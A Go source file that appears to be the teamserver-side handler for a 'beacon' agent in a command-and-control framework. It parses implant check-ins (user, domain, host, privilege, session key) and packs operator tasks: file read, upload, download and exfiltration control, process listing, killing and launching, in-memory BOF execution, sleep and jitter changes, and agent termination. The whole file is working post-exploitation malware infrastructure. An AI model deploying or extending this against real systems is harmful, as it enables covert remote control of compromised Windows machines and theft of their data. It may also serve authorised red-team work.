package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"time"
)

const (
	SetName            = "beacon"
	SetListener        = "BeaconHTTP"
	SetUiPath          = "_ui_agent.json"
	SetCmdPath         = "_cmd_agent.json"
	SetMaxTaskDataSize = 0x1900000 // 25 Mb
)

func CreateAgent(initialData []byte) (AgentData, error) {
	var agent AgentData

	/// START CODE HERE

	packer := CreatePacker(initialData)
	agent.Sleep = packer.ParseInt32()
	agent.Jitter = packer.ParseInt32()
	agent.ACP = int(packer.ParseInt16())
	agent.OemCP = int(packer.ParseInt16())
	agent.GmtOffset = int(packer.ParseInt8())
	agent.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agent.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agent.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agent.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agent.Elevated = false
	if (flag & 0b00000100) > 0 {
		agent.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agent.InternalIP = int32ToIPv4(internalIp)
	agent.Os, agent.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agent.Async = true
	agent.SessionKey = packer.ParseBytes()
	agent.Domain = string(packer.ParseBytes())
	agent.Computer = string(packer.ParseBytes())
	agent.Username = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)
	agent.Process = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)

	/// END CODE

	return agent, nil
}

func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasksArray {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
	chunkSize := 0x100000 // 1Mb
	memoryId := int(rand.Uint32())

	bufferSize := len(buffer)

	taskData := TaskData{
		Type:    TASK,
		AgentId: agentId,
		Sync:    false,
	}

	for start := 0; start < bufferSize; start += chunkSize {
		fin := start + chunkSize
		if fin > bufferSize {
			fin = bufferSize
		}

		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}

		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())
		taskData.Data, _ = PackArray(array)

		var taskBuffer bytes.Buffer
		_ = json.NewEncoder(&taskBuffer).Encode(taskData)

		ts.TsTaskQueueAddQuite(agentId, taskBuffer.Bytes())
	}
	return memoryId
}

func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]any) (TaskData, string, error) {
	var (
		taskData TaskData
		err      error
	)

	subcommand, _ := args["subcommand"].(string)
	messageInfo, _ := args["message"].(string)

	/// START CODE HERE

	var (
		array    []interface{}
		packData []byte
		taskType TaskType = TASK
	)

	switch command {

	case "cat":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_CAT, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_CD, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "cp":
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto RET
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_COPY, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}

		break

	case "disks":
		array = []interface{}{COMMAND_DISKS}
		break

	case "download":
		path, ok := args["file"].(string)
		if !ok {
			err = errors.New("parameter 'file' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "execute":
		if subcommand == "bof" {
			taskType = JOB

			bofFile, ok := args["bof"].(string)
			if !ok {
				err = errors.New("parameter 'bof' must be set")
				goto RET
			}
			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
			if err != nil {
				goto RET
			}

			var params []byte
			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
				}
			}

			array = []interface{}{COMMAND_EXEC_BOF, "go", len(bofContent), bofContent, len(params), params}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}
		break

	case "exfil":
		fid, ok := args["file_id"].(string)
		if !ok {
			err = errors.New("parameter 'file_id' must be set")
			goto RET
		}

		fileId, err := strconv.ParseInt(fid, 16, 64)
		if err != nil {
			goto RET
		}

		if subcommand == "cancel" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_CANCELED, int(fileId)}
		} else if subcommand == "stop" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_STOPPED, int(fileId)}
		} else if subcommand == "start" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_RUNNING, int(fileId)}
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}
		break

	case "jobs":
		if subcommand == "list" {
			array = []interface{}{COMMAND_JOB_LIST}

		} else if subcommand == "kill" {
			job, ok := args["task_id"].(string)
			if !ok {
				err = errors.New("parameter 'task_id' must be set")
				goto RET
			}

			jobId, err := strconv.ParseInt(job, 16, 64)
			if err != nil {
				goto RET
			}

			array = []interface{}{COMMAND_JOBS_KILL, int(jobId)}
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}
		break

	case "ls":
		dir, ok := args["directory"].(string)
		if !ok {
			err = errors.New("parameter 'directory' must be set")
			goto RET
		}
		dir = ConvertUTF8toCp(dir, agent.ACP)

		array = []interface{}{COMMAND_LS, dir}

	case "mv":
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto RET
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_MV, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}

		break

	case "mkdir":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "profile":
		if subcommand == "download.chunksize" {

			size, ok := args["size"].(float64)
			if !ok {
				err = errors.New("parameter 'size' must be set")
				goto RET
			}
			array = []interface{}{COMMAND_PROFILE, 2, int(size)}

		} else {
			err = errors.New("subcommand for 'profile' not found")
			goto RET
		}
		break

	case "ps":
		if subcommand == "list" {
			array = []interface{}{COMMAND_PS_LIST}

		} else if subcommand == "kill" {
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}
			array = []interface{}{COMMAND_PS_KILL, int(pid)}

		} else if subcommand == "run" {
			taskType = JOB

			output, _ := args["-o"].(bool)
			suspend, _ := args["-s"].(bool)
			programState := 0
			if suspend {
				programState = 4
			}
			programArgs, ok := args["args"].(string)
			if ok {
				programArgs = ConvertUTF8toCp(programArgs, agent.ACP)
			}

			program, ok := args["program"].(string)
			if !ok {
				err = errors.New("parameter 'program' must be set")
				goto RET
			}
			program = ConvertUTF8toCp(program, agent.ACP)

			array = []interface{}{COMMAND_PS_RUN, output, programState, program, programArgs}

		} else {
			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
			goto RET
		}
		break

	case "pwd":
		array = []interface{}{COMMAND_PWD}
		break

	case "rm":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_RM, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "sleep":
		var (
			sleepTime  int
			jitter     float64
			jitterTime int = 0
			jitterOk   bool
		)
		sleep, sleepOk := args["sleep"].(string)
		if !sleepOk {
			err = errors.New("parameter 'sleep' must be set")
			goto RET
		}
		jitter, jitterOk = args["jitter"].(float64)
		jitterTime = int(jitter)

		sleepInt, err := strconv.Atoi(sleep)
		if err == nil {
			sleepTime = sleepInt
		} else {
			t, err := time.ParseDuration(sleep)
			if err == nil {
				sleepTime = int(t.Seconds())
			} else {
				err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
				goto RET
			}
		}
		messageInfo = fmt.Sprintf("Task: sleep to %v", sleep)

		if jitterOk {
			if jitterTime < 0 || jitterTime > 100 {
				err = errors.New("jitterTime must be from 0 to 100")
				goto RET
			}
			messageInfo = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		}

		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

		break

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}
		break

	case "upload":
		fileName, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			goto RET
		}
		localFile, ok := args["local_file"].(string)
		if !ok {
			err = errors.New("parameter 'local_file' must be set")
			goto RET
		}

		fileContent, err := base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		memoryId := CreateTaskCommandSaveMemory(ts, agent.Id, fileContent)

		array = []interface{}{COMMAND_UPLOAD, memoryId, ConvertUTF8toCp(fileName, agent.ACP)}

		break

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	packData, err = PackArray(array)
	if err != nil {
		goto RET
	}

	taskData = TaskData{
		Type: taskType,
		Data: packData,
		Sync: true,
	}

	/// END CODE

RET:
	return taskData, messageInfo, err
}

func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, packedData []byte) {

	packer := CreatePacker(packedData)
	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		fmt.Println("Invalid tasks data")
	}

	for packer.Size() >= 8 {
		var taskObject bytes.Buffer

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case COMMAND_CAT:
			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)
			break

		case COMMAND_CD:
			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path
			break

		case COMMAND_COPY:
			task.Message = "File copied successfully"
			break

		case COMMAND_DISKS:
			result := packer.ParseInt8()
			var drives []ListingDrivesData

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
				task.MessageType = MESSAGE_ERROR

			} else {
				drivesCount := int(packer.ParseInt32())
				for i := 0; i < drivesCount; i++ {
					var driveData ListingDrivesData
					driveCode := packer.ParseInt8()
					driveType := packer.ParseInt32()

					driveData.Name = fmt.Sprintf("%c:", driveCode)
					if driveType == 2 {
						driveData.Type = "USB"
					} else if driveType == 3 {
						driveData.Type = "Hard Drive"
					} else if driveType == 4 {
						driveData.Type = "Network Drive"
					} else if driveType == 5 {
						driveData.Type = "CD-ROM"
					} else {
						driveData.Type = "Unknown"
					}

					drives = append(drives, driveData)
				}

				OutputText := fmt.Sprintf(" %-5s  %s\n", "Drive", "Type")
				OutputText += fmt.Sprintf(" %-5s  %s", "-----", "-----")
				for _, item := range drives {
					OutputText += fmt.Sprintf("\n %-5s  %s", item.Name, item.Type)
				}
				task.Message = "List of mounted drives:"
				task.ClearText = OutputText
			}

			SyncBrowserDisks(ts, task, drives)

			break

		case COMMAND_DOWNLOAD:
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				fileSize := packer.ParseInt32()
				fileName := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
				task.Completed = false
				ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))

			} else if downloadCommand == DOWNLOAD_CONTINUE {
				fileContent := packer.ParseBytes()
				task.Completed = false
				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, fileContent)
				continue

			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_FINISHED)
			}
			break

		case COMMAND_EXFIL:
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()

			if downloadState == DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_STOPPED, []byte(""))

			} else if downloadState == DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, []byte(""))

			} else if downloadState == DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_CANCELED)
			}
			break

		case COMMAND_EXEC_BOF:
			task.Message = "BOF finished"
			task.Completed = true
			break

		case COMMAND_EXEC_BOF_OUT:

			outputType := packer.ParseInt32()
			output := packer.ParseString()

			if outputType == BOF_ERROR_PARSE {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Parse BOF error"
			} else if outputType == BOF_ERROR_MAX_FUNCS {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "The number of functions in the BOF file exceeds 512"
			} else if outputType == BOF_ERROR_ENTRY {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Entry function not found"

			} else if outputType == BOF_ERROR_ALLOC {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Error allocation of BOF memory"

			} else if outputType == BOF_ERROR_SYMBOL {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Symbol not found: " + output + "\n"

			} else if outputType == CALLBACK_ERROR {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)

			} else if outputType == CALLBACK_OUTPUT_OEM {
				task.MessageType = MESSAGE_SUCCESS
				task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.OemCP)

			} else {
				task.MessageType = MESSAGE_SUCCESS
				task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
			}

			task.Completed = false
			break

		case COMMAND_JOB:
			state := packer.ParseInt8()
			if state == JOB_STATE_RUNNING {
				task.Completed = false
				jobOutput := ConvertCpToUTF8(string(packer.ParseString()), agentData.OemCP)
				task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
				task.ClearText = jobOutput
			} else if state == JOB_STATE_KILLED {
				task.Completed = true
				task.MessageType = MESSAGE_INFO
				task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
			} else if state == JOB_STATE_FINISHED {
				task.Completed = true
				task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
			}
			break

		case COMMAND_JOB_LIST:
			var Output string
			count := packer.ParseInt32()

			if count > 0 {
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s\n", "JobID", "PID", "Type")
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s", "--------", "-----", "-------")
				for i := 0; i < int(count); i++ {
					jobId := fmt.Sprintf("%08x", packer.ParseInt32())
					jobType := packer.ParseInt16()
					pid := packer.ParseInt16()

					stringType := "Unknown"
					if jobType == 0x1 {
						stringType = "Local"
					} else if jobType == 0x2 {
						stringType = "Remote"
					} else if jobType == 0x3 {
						stringType = "Process"
					}
					Output += fmt.Sprintf("\n %-10v  %-5v  %-13s", jobId, pid, stringType)
				}
				task.Message = "Job list:"
				task.ClearText = Output
			} else {
				task.Message = "No active jobs"
			}
			break

		case COMMAND_JOBS_KILL:
			result := packer.ParseInt8()
			jobId := packer.ParseInt32()

			if result == 0 {
				task.MessageType = MESSAGE_ERROR
				task.Message = fmt.Sprintf("Job %v not found", jobId)
			} else {
				task.Message = fmt.Sprintf("Job %v mark as Killed", jobId)
			}

			break

		case COMMAND_LS:
			result := packer.ParseInt8()

			var items []ListingFileData
			var rootPath string

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
				task.MessageType = MESSAGE_ERROR

			} else {
				rootPath = ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")

				filesCount := int(packer.ParseInt32())

				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {

					var folders []ListingFileData
					var files []ListingFileData

					for i := 0; i < filesCount; i++ {
						isDir := packer.ParseInt8()
						fileData := ListingFileData{
							IsDir:    false,
							Size:     packer.ParseInt64(),
							Date:     uint64(packer.ParseInt32()),
							Filename: ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}

					items = append(folders, files...)

					OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

					for _, item := range items {
						t := time.Unix(int64(item.Date), 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

						if item.IsDir {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("List of files in the '%s' directory", rootPath)
					task.ClearText = OutputText
				}
			}

			SyncBrowserFiles(ts, task, rootPath, items)

			break

		case COMMAND_MKDIR:
			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)
			break

		case COMMAND_MV:
			task.Message = "File moved successfully"
			break

		case COMMAND_PROFILE:
			subcommand := packer.ParseInt32()
			if subcommand == 1 {
				sleep := packer.ParseInt32()
				jitter := packer.ParseInt32()

				agentData.Sleep = sleep
				agentData.Jitter = jitter

				task.Message = "Sleep time has been changed"

				var buffer bytes.Buffer
				json.NewEncoder(&buffer).Encode(agentData)

				ts.TsAgentUpdateData(buffer.Bytes())

			} else if subcommand == 2 {
				size := packer.ParseInt32()
				task.Message = fmt.Sprintf("Download chunk size set to %v bytes", size)
			}
			break

		case COMMAND_PS_LIST:
			result := packer.ParseInt8()

			var proclist []ListingProcessData

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
				task.MessageType = MESSAGE_ERROR

			} else {
				processCount := int(packer.ParseInt32())

				if processCount == 0 {
					task.Message = "Failed to get process list"
					task.MessageType = MESSAGE_ERROR
					break
				}

				contextMaxSize := 10

				for i := 0; i < processCount; i++ {
					procData := ListingProcessData{
						Pid:       uint(packer.ParseInt16()),
						Ppid:      uint(packer.ParseInt16()),
						SessionId: uint(packer.ParseInt16()),
						Arch:      "",
					}

					isArch64 := packer.ParseInt8()
					if isArch64 == 0 {
						procData.Arch = "x32"
					} else if isArch64 == 1 {
						procData.Arch = "x64"
					}

					elevated := packer.ParseInt8()
					domain := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
					username := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)

					if username != "" {
						procData.Context = username
						if domain != "" {
							procData.Context = domain + "\\" + username
						}
						if elevated > 0 {
							procData.Context += " *"
						}

						if len(procData.Context) > contextMaxSize {
							contextMaxSize = len(procData.Context)
						}
					}

					procData.ProcessName = ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)

					proclist = append(proclist, procData)
				}

				format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%-7v", contextMaxSize)
				OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
				OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

				for _, item := range proclist {
					OutputText += fmt.Sprintf("\n"+format, item.Pid, item.Ppid, item.SessionId, item.Arch, item.Context, item.ProcessName)
				}
				task.Message = "Process list:"
				task.ClearText = OutputText
			}

			SyncBrowserProcess(ts, task, proclist)

			break

		case COMMAND_PS_KILL:
			pid := packer.ParseInt32()
			task.Message = fmt.Sprintf("Process %d killed", pid)
			break

		case COMMAND_PS_RUN:
			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)

			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}

			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)
			break

		case COMMAND_PWD:
			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path
			break

		case COMMAND_RM:
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}
			break

		case COMMAND_TERMINATE:
			exitMethod := packer.ParseInt32()
			if exitMethod == 1 {
				task.Message = "The agent has completed its work (kill thread)"
			} else if exitMethod == 2 {
				task.Message = "The agent has completed its work (kill process)"
			}
			break

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			SyncBrowserFilesStatus(ts, task)
			break

		case COMMAND_ERROR:
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
			task.MessageType = MESSAGE_ERROR

		default:
			continue
		}

		_ = json.NewEncoder(&taskObject).Encode(task)
		ts.TsTaskUpdate(agentData.Id, taskObject.Bytes())
	}
}

/// BROWSERS

func BrowserDownloadChangeState(fid string, newState int) ([]byte, error) {
	fileId, err := strconv.ParseInt(fid, 16, 64)
	if err != nil {
		return nil, err
	}

	array := []interface{}{COMMAND_EXFIL, newState, int(fileId)}

	return PackArray(array)
}

func BrowserDisks(agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_DISKS}
	return PackArray(array)
}

func BrowserProcess(agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_PS_LIST}
	return PackArray(array)
}

func BrowserFiles(path string, agentData AgentData) ([]byte, error) {
	dir := ConvertUTF8toCp(path, agentData.ACP)
	array := []interface{}{COMMAND_LS, dir}
	return PackArray(array)
}

func BrowserUpload(ts Teamserver, path string, content []byte, agentData AgentData) ([]byte, error) {
	memoryId := CreateTaskCommandSaveMemory(ts, agentData.Id, content)
	fileName := ConvertUTF8toCp(path, agentData.ACP)
	array := []interface{}{COMMAND_UPLOAD, memoryId, fileName}
	return PackArray(array)
}

func BrowserDownload(path string, agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agentData.ACP)}
	return PackArray(array)
}

func BrowserJobKill(jobId string) ([]byte, error) {
	jobIdstr, err := strconv.ParseInt(jobId, 16, 64)
	if err != nil {
		return nil, err
	}

	array := []interface{}{COMMAND_JOBS_KILL, int(jobIdstr)}
	return PackArray(array)
}

func BrowserExit(agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_TERMINATE, 2}
	return PackArray(array)
}
